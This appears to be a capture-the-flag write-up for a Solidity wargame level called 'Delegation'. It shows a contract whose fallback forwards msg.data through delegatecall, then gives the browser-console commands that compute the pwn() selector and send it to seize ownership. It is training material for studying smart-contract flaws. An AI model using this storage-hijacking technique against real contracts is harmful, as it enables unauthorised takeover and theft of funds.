# 06 Delegation

```
The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
Fallback methods
Method ids
```
####  code
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

```

#### Start 


### (1) ` claim ownership`

The hint he tells us about delegatecall 


Looking at the code, You can see  the contract have `fallback()` and use `delegatecall()` 

#### `delegatecall()` 

Exampl. when A `delegatecall()` to B, the code runs in contract B scope, but when updating storage it updates to contract A scope.

warning the storage structure must be the same

how do we do

.

.

.


.

.

.

As you can see, in contract Delegation there is use `delegatecall()` in `fallback()` function to the contract Delegate, 

and in the Delegate contract there is a `function pwn() public` which changes the owner `owner = msg.sender`

means that we have to call fallback and put msg.data with  `function pwn()`

#### Open Developer Tools (F12)

- (1)  In `msg.data` , the data to be sent must be hashed first, which is done by use web3.utils.keccak256 or web3.utils.sha3

    type `web3.utils.keccak256("pwn()")` 

    you will see a message 

    `'0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab'` this is msg.data to call  `function pwn()`

- (2) We will need to pass `msg.data` to the `fallback()` function to trigger a `delegatecall` with our `msg.data`
  
  
    type `await contract.sendTransaction({data: "0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab"})` 
    
    and confirm transaction




Click button Submit instance and confirm transaction

# !!! we passed !!!


